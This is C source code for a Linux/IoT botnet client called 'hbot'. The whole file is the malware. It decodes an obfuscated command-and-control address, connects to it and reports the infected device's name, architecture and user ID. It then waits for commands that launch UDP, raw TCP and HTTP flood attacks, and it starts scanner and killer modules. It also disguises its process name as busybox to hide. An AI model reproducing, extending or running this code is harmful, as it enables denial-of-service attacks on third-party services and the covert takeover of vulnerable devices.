/*
fat boat hbot
*/

#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <time.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include "includes.h"

int bot_port = 9090;
//char *bot_host = "1.1.1.1";
char bot_host[] = {"4<;1451<:1;8"};
char http_arg[] = {"KWWS"};
char udp_arg[] = {"XGS"};
char tcp_arg[] = {"WFS"};
char ping_buf[] = {"SLQJ"};
char kill_buf[] = {"NLOOPHQRZ"};
char pong_buf[] = {"SRQJ"};
char proc_name[] = {"0vk"};

struct udpflood {
    char *target;
    int port;
    int time;
    int psize; //why not
} udp;
struct tcpflood {
    char *target;
    int port;
    int time;
    int psize; //why not
} tcp;
struct httpflood {
	char *target;
	int port;
	int time;
	char *method;
	int threads;
} http;

#define array_size(a) sizeof(a) / sizeof(a[0])
 
const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
    "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11"
};

int get_host(unsigned char *toGet, struct in_addr *i)
{
    struct hostent *h;

    if((i->s_addr = inet_addr(toGet)) == -1)
        return 1;

    return 0;
}
#ifdef ARCH_ARM
#define BOT_ARCH "arm"
#elif ARCH_ARM7
#define BOT_ARCH "arm7"
#elif ARCH_MIPS
#define BOT_ARCH "mips"
#elif ARCH_MIPSEL
#define BOT_ARCH "mpsl"
#elif ARCH_POWERPC
#define BOT_ARCH "powerpc"
#elif ARCH_X86_64
#define BOT_ARCH "x86_64"
#elif ARCH_X86_32
#define BOT_ARCH "x86_32"
#else
#define BOT_ARCH "unknown"
#endif

/*
void *hakka_con(char *name)
{
int retry = 0;
int connected = 0;
char registermsg[100];
char register2[28];
decrypt(bot_host); 
tryagain:;
	if(connected)
	{
		sleep(5);
		//continue;
	}
    struct sockaddr_in cncsoccet;
	C2Sock = socket(AF_INET, SOCK_STREAM, 0);
	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt;
	long arg = fcntl(C2Sock, F_GETFL, NULL);
	arg |= O_NONBLOCK;
	fcntl(C2Sock, F_SETFL, arg);
    cncsoccet.sin_family = AF_INET;
    cncsoccet.sin_port = htons(bot_port);
    cncsoccet.sin_addr.s_addr = inet_addr(bot_host);
	if(get_host(bot_host, &cncsoccet.sin_addr))
        return 0;
	memset(cncsoccet.sin_zero, '\0', sizeof cncsoccet.sin_zero);
    if(connect(C2Sock, (struct sockaddr *)&cncsoccet, sizeof(cncsoccet)) < 1)
    {
		retry++;
		if (retry > 9)
		{
			sleep(15);
			retry = 0;
		}
		#ifdef DEBUG
		printf("Unable To Connect To CNC \r\n");
		#endif
			if (errno == EINPROGRESS)
			{
				tv.tv_sec = 30;
				tv.tv_usec = 0;
				FD_ZERO(&myset);
				FD_SET(C2Sock, &myset);

				if (select(C2Sock + 1, NULL, &myset, NULL, &tv) > 0)
				{
					lon = sizeof(int);
					getsockopt(C2Sock, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);

					if (valopt)
						goto tryagain;
				}
				else
					goto tryagain;
			}
			else
				goto tryagain;
		
    }
	#ifdef DEBUG
    printf("Connected To CNC\r\n");
	#endif
	connected = 1;

    sprintf(registermsg, "arch %s\n", getBuild());
    sprintf(registermsg, "Device Connected [Name:%s] [Arch:%s] [UID:%d]\n", name, getBuild(), getuid());
	
    write(C2Sock, registermsg, strlen(registermsg));
	arg = fcntl(C2Sock, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(C2Sock, F_SETFL, arg);
}
*/

void udp_attack(unsigned char *target, int port, int duration, int psize)
{
    if(psize > 1024)
    {
    	psize = 1024; 
    }
    int threads = 1000;
    char *data = malloc(1024);
    struct sockaddr_in MainSock;
    int mysock = socket(AF_INET, SOCK_DGRAM, 0);
    MainSock.sin_family = AF_INET;
    MainSock.sin_addr.s_addr = inet_addr(target);
    MainSock.sin_port = htons(port);
    int end;
    end = time(NULL) + duration;
	int g;
    for(g = 0; g < threads; g++)
    {
		while(end > time(NULL)) 
		{
			data[psize] = (char)((rand() % 70) + 30);
			connect(mysock, (struct sockaddr *)&MainSock, sizeof(MainSock));
			send(mysock, data, psize, 0); 
		}
    }
	free(data);
	close(mysock);
}
void tcp_attack(unsigned char *ip, int port, int secs, int psize) //not tested
{
	int sockfd, tport;
	time_t start = time(NULL);
    struct sockaddr_in serv_addr;
    char *sendbuf = malloc(512);
    if(psize > 1024)
    {
    	psize = 1024; 
    }
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(ip);
    
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof (serv_addr));

    while(1) 
    {
        if(port == 0)
            serv_addr.sin_port = rand() % 65535;
        else
            serv_addr.sin_port = htons(port);
       
        sendbuf[psize] = (char)((rand() % 70) + 30);
        send(sockfd, sendbuf, psize, 0);

        if(time(NULL) >= start + secs) 
        {
            close(sockfd);
            free(sendbuf);
            _exit(0);
        }
    }
    free(sendbuf);
}
char *hexstring = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A";


void http_attack(char *target, int port, int duration, char *method, int threads)
{
    char *path = "/";
    char request[512];
    char buf[512];
    struct sockaddr_in http;
    int mysock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    http.sin_family = AF_INET;
    http.sin_addr.s_addr = inet_addr(target);
    http.sin_port = htons(port);
    int g, end;
    end = time(NULL) + duration;
 
    if(connect(mysock, (struct sockaddr * )&http, sizeof(http)) == -1)
    {
        printf("Unable To Connect to Target: %s:%d \r\n", target, port);
    }
    else
    {
        printf("Connected To Target: %s:%d \r\n", target, port);
        printf("Sending requests to: %s:%d \r\n", target, port);
			if(!strcmp(method, "POST"))
			{
				sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type: text/plain\r\nContent-length: %d\r\n\r\n %s\r\n", method, path, target, useragents[(rand() % array_size(useragents))], sizeof(hexstring), hexstring);
			}
			else
			{
				sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, target, useragents[(rand() % array_size(useragents))]);
            }
		for(g=0; g < threads; g++)
        {
			if(fork())
			{
				while(end > time(NULL))
				{
					connect(mysock, (struct sockaddr * )&http, sizeof(http));
					write(mysock, request, strlen(request));
					read(mysock, buf, sizeof(buf));
					close(mysock);
				}
				exit(0);
			}
		}
    }
}

void udp_send(int argc, unsigned char **argv)
{
	//printf("reading udp flood \n");
    udp.target = argv[1];
    udp.port = atoi(argv[2]);
    udp.time = atoi(argv[3]);
    udp.psize = atoi(argv[4]);
	//printf("reading udp flood, Target: %s:%d for %d seconds with %d sized packets\r\n", udp.target, udp.port, udp.time, udp.psize);
    if(!fork())
    {
#ifdef DEBUG
        printf("reading udp flood, Target: %s:%d for %d seconds with %d sized packets\r\n", udp.target, udp.port, udp.time, udp.psize);
#endif
        udp_attack(udp.target, udp.port, udp.time, udp.psize);
    }
    return;
}

void tcp_send(int argc, unsigned char **argv)
{
    tcp.target = argv[1];
    tcp.port = atoi(argv[2]);
    tcp.time = atoi(argv[3]);
    tcp.psize = atoi(argv[4]);
    if(!fork())
    {
#ifdef DEBUG
        printf("reading tcp flood, Target: %s:%d for %d seconds with %d sized packets\r\n", tcp.target, tcp.port, tcp.time, tcp.psize);
#endif
        tcp_attack(tcp.target, tcp.port, tcp.time, tcp.psize);
    }
    return;
}

void http_send(int argc, unsigned char **argv)
{
    http.target = argv[1];
    http.port = atoi(argv[2]);
    http.time = atoi(argv[3]);
    http.method = argv[4];
	http.threads = atoi(argv[5]);
    if(!fork())
    {
#ifdef DEBUG
        printf("reading http flood, Target: %s:%d for %d seconds with %s Method\r\n", http.target, http.port, http.time, http.method);
#endif
        http_attack(http.target, http.port, http.time, http.method, http.threads);
    }
    return;
}

void parse_buf()
{
	decrypt(http_arg);
	decrypt(udp_arg);
	decrypt(tcp_arg);
	decrypt(kill_buf);
	decrypt(ping_buf);
	decrypt(pong_buf);
    char buf[512];
    while(read(C2Sock,buf,sizeof(buf)))
    {
        int g;
        int argcount=0;
        unsigned char *buffer[512];
        char *split;
        for(split = strtok(buf," "); split != NULL; split = strtok(NULL, " "))
        {
            buffer[argcount++] = malloc(strlen(split) + 1);
            strcpy(buffer[argcount-1], split);
        }
		#ifdef DEBUG
		//printf("%s", buf);
		#endif
        if(strstr(buf, udp_arg))
        {
            udp_send(argcount,buffer);
        }
        if(strstr(buf, tcp_arg))
        {
            tcp_send(argcount,buffer);
        }
		if(strstr(buf, http_arg))
        {
            http_send(argcount,buffer);
        }
		if(strstr(buf, kill_buf))
        {
            exit(0);
        }
		if(strstr(buf, ping_buf))
        {
            write(C2Sock, pong_buf, strlen(pong_buf));
        }
        for(g=0; g<argcount; g++)
        {
            free(buffer[g]);
        }
		memset(buf, 0, 512);
		memset(buffer, 0, 512);
    }
}

void hakka_con(char *name)
{
	struct sockaddr_in cncsoccet;
	int retrys = 10;
	int retry = 0;
	int tryagain = 1;
	int connected = 0;
	decrypt(bot_host);
    retryme:
    fcntl(C2Sock, F_SETFL, O_NONBLOCK | fcntl(C2Sock, F_GETFL, 0));
    if((C2Sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
		connected = 0;
        close(C2Sock);
        close(0);
    }
    cncsoccet.sin_family = AF_INET;
    cncsoccet.sin_addr.s_addr = inet_addr(bot_host);
    cncsoccet.sin_port = htons(bot_port);
    if(connect(C2Sock, (struct sockaddr *)&cncsoccet, sizeof(cncsoccet)) == -1)
    {
		connected = 0;
		//printf("cant connect to cnc\n");
          if(retry == retrys)
          {
            retry = 0;
			close(C2Sock);			
			printf("cant connect to cnc: %d\n", connected);
			sleep(5);
			goto retryme;
          }
          else if(tryagain == 1)
          {
              close(C2Sock);
              retry++;
              goto retryme;
          }
    }
    else
    {
		if(connected < 1)	
		{
			#ifdef DEBUG
			printf("connected to cnc...\n");
			#endif
			char registermsg[28];
			char registermsg2[100];
			sprintf(registermsg, "name:%s\n", name);
			sprintf(registermsg2, "Device Connected [Name:%s] [Arch:%s] [UID:%d]\n", name, BOT_ARCH, getuid());
			connected = 1;
			write(C2Sock, registermsg, strlen(registermsg));
			write(C2Sock, registermsg2, strlen(registermsg2));
			int main_pid = getpid();
			scanner_init(C2Sock);
			#ifndef DEBUG
			killer_init(C2Sock, main_pid);
			#endif
		}
      }
}

int main(int argc, char * argv[]) {
	if(fork() > 0) return NULL;
	printf("hbot proc starting...\n");
	decrypt(proc_name);
	/////////////////////////////////// simple way to hide process
	prctl(15, (unsigned long)"/bin/busybox", 0, 0, 0);
	memset(argv[0], 0, sizeof(argv[0]));
	strcpy(argv[0], proc_name);
	/////////////////////////
	while(1)
	{
		hakka_con(argv[1]);
		parse_buf();
	}
	//return 0;
}

